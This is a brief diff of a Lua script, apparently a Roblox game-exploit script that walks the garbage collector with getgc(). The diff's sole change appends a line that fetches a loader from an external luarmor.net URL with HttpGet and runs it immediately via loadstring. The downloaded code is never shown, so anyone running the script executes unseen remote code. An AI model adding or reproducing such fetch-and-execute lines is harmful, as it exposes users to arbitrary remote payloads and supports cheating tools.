@@ -25,3 +25,4 @@ for _, Value in next, getgc() do
         end
     end
 end
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/24b5bd3aa14490d03cb0f5f52030a107.lua"))()
